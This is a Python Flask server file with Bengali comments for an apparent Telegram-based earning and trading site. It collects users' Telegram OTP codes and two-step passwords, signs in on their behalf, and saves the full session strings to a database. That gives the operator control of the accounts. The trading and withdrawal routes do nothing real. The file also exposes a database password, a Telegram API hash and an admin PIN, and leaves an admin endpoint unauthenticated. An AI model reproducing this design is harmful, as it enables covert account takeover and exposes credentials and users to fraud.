import os
import asyncio
import random
import time
import uuid
import datetime
from datetime import datetime, timedelta
from threading import Thread
from functools import wraps
from flask import Flask, render_template, request, jsonify, session, redirect, url_for
from flask_cors import CORS
from pymongo import MongoClient
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
from bson import ObjectId
import firebase_admin
from firebase_admin import credentials, db

# ---------------------------------------------------------
# ১. কনফিগারেশন ও ডাটাবেস সেটআপ
# ---------------------------------------------------------
app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "aaf_strong_secure_786")

# সেশন সিকিউরিটি (Render/Mobile Server এর জন্য)
app.config.update(
    SESSION_COOKIE_SAMESITE='Lax',
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_HTTPONLY=True,
    PERMANENT_SESSION_LIFETIME=timedelta(days=10)
)

@app.before_request
def make_session_permanent():
    session.permanent = True

CORS(app, resources={r"/api/*": {"origins": "*"}}, supports_credentials=True)

# API & DB Credentials
API_ID = 36466824
API_HASH = "535ddcb85f2c3c74cc0ff532dd2c3406"
MONGO_URI = "mongodb+srv://abdullahasfakfarvezbd_db_user:Abdullah6790@cluster0.rmulyqq.mongodb.net/?retryWrites=true&w=majority"

# Firebase Setup
try:
    if not firebase_admin._apps:
        cred = credentials.Certificate("firebase-key.json")
        firebase_admin.initialize_app(cred, {
            'databaseURL': 'https://teleearnbd-default-rtdb.firebaseio.com/' 
        })
    fb_ref = db.reference('candles')
except Exception as e:
    print(f"Firebase Init Error: {e}")

# MongoDB Setup
client_db = MongoClient(MONGO_URI)
mdb = client_db['aaf_tele_earn_db']
users_col = mdb['users']
settings_col = mdb['settings']
tasks_col = mdb['tasks']

temp_clients = {}

# --- সিকিউরিটি চেক (Login Required) ---
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'uid' not in session:
            return redirect(url_for('index'))
        return f(*args, **kwargs)
    return decorated_function

# ---------------------------------------------------------
# ২. টেলিগ্রাম অথেন্টিকেশন (OTP & 2FA)
# ---------------------------------------------------------
@app.route('/api/send_otp', methods=['POST'])
def send_otp_handler():
    data = request.json
    phone = data.get('phone')
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        client.connect()
        result = client.send_code_request(phone)
        temp_clients[phone] = {"client": client, "hash": result.phone_code_hash}
        return jsonify({"success": True})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

@app.route('/api/verify_login', methods=['POST'])
def verify_login_handler():
    data = request.json
    phone = data.get('phone')
    code = data.get('code')
    password = data.get('password') # ২-স্টেপ পাসওয়ার্ড

    if phone not in temp_clients: 
        return jsonify({"success": False, "message": "Session Expired"})
    
    client = temp_clients[phone]["client"]
    h = temp_clients[phone]["hash"]

    try:
        user = client.sign_in(phone, code, phone_code_hash=h, password=password)
        session_str = client.session.save()
        
        # ইউজার ডাটা আপডেট (টেলিগ্রাম স্টাইল মাল্টি অ্যাকাউন্ট)
        users_col.update_one(
            {"telegram_id": user.id},
            {"$set": {
                "phone": phone,
                "name": f"{user.first_name or ''} {user.last_name or ''}",
                "session_string": session_str,
                "ip_address": request.remote_addr,
                "last_login": datetime.utcnow()
            }, "$setOnInsert": {
                "main_balance": 0.0, 
                "aaf_balance": 0.0, 
                "trade_count": 0,
                "is_joined": False,
                "completed_tasks": []
            }},
            upsert=True
        )
        session["uid"] = user.id
        return jsonify({"success": True, "uid": user.id})

    except SessionPasswordNeededError:
        return jsonify({"success": False, "requires_password": True, "message": "2-Step Verification Required"})
    except Exception as e:
        return jsonify({"success": False, "message": str(e)})

# (পার্ট-১ শেষ, নিচে পার্ট-২ যোগ করুন)

# ---------------------------------------------------------
# ৩. পেজ রাউটস (আপনার GitHub ফাইলের নাম অনুযায়ী)
# ---------------------------------------------------------
@app.route('/')
def index():
    if 'uid' in session: return redirect(url_for('render_dashboard_page'))
    return render_template('login.html')

@app.route('/dashboard')
@login_required
def render_dashboard_page(): 
    user = users_col.find_one({"telegram_id": int(session['uid'])})
    admin = settings_col.find_one({"type": "global"})
    return render_template('dashboard.html', user=user, admin=admin)

@app.route('/task')
@login_required
def render_task_page(): return render_template('task.html')

@app.route('/trading')
@login_required
def render_treading_page(): return render_template('trading.html')

@app.route('/wallet')
@login_required
def render_wallet_page(): return render_template('wallet.html')

@app.route('/account')
@login_required
def render_account_page(): return render_template('account.html')

@app.route('/refer_list')
@login_required
def render_refer_page(): return render_template('refer_list.html')

@app.route('/payment_history')
@login_required
def render_history_page(): return render_template('payment_history.html')

# ---------------------------------------------------------
# ৪. ট্রেডিং ও সিকিউরিটি লজিক (উইথড্র ও আইপি লিমিট)
# ---------------------------------------------------------
@app.route('/api/trade/execute', methods=['POST'])
@login_required
def trade_execute():
    data = request.json
    uid = int(session['uid'])
    amount = float(data.get('amount', 0))
    
    # অ্যাডমিন সেটিংস চেক
    admin = settings_col.find_one({"type": "global"})
    if admin.get('ip_limit') == 'on':
        ip_exists = users_col.find_one({"ip_address": request.remote_addr, "telegram_id": {"$ne": uid}})
        if ip_exists:
            return jsonify({"status": "error", "message": "Multi-account detected on this IP!"})

    # ট্রেড প্রসেস ও কাউন্টার আপডেট
    users_col.update_one({"telegram_id": uid}, {"$inc": {"trade_count": 1}})
    return jsonify({"status": "success", "message": "Trade completed"})

@app.route('/api/withdraw/request', methods=['POST'])
@login_required
def withdraw_req():
    user = users_col.find_one({"telegram_id": int(session['uid'])})
    admin = settings_col.find_one({"type": "global"})
    
    # উইথড্র শর্ত (মিনিমাম ট্রেড)
    if user.get('trade_count', 0) < admin.get('min_trades', 5):
        return jsonify({"status": "error", "message": f"Minimum {admin.get('min_trades')} trades required!"})
    
    return jsonify({"status": "success", "message": "Withdrawal request sent"})

# ---------------------------------------------------------
# ৫. অ্যাডমিন কন্ট্রোল (aaf449 / admin.html)
# ---------------------------------------------------------
@app.route('/admin')
def render_admin_panel():
    pin = request.args.get('pin')
    if pin == "Abdullah6790": # আপনার পিন
        return render_template('admin.html')
    return "Unauthorized", 403

@app.route('/api/admin/update_settings', methods=['POST'])
def update_settings():
    data = request.json
    settings_col.update_one(
        {"type": "global"},
        {"$set": {
            "channel_link": data.get('link'),
            "min_trades": int(data.get('min_trades', 5)),
            "ip_limit": data.get('ip_limit', 'on')
        }},
        upsert=True
    )
    return jsonify({"success": True})

# ---------------------------------------------------------
# ৬. সার্ভার রান (Port 10000)
if __name__ == "__main__":
    # Render এর এনভায়রনমেন্ট থেকে পোর্ট নেওয়া, না থাকলে ১০০০০ ব্যবহার করা
    port = int(os.environ.get("PORT", 10000))
    # host অবশ্যই '0.0.0.0' হতে হবে
    app.run(host="0.0.0.0", port=port, debug=False)
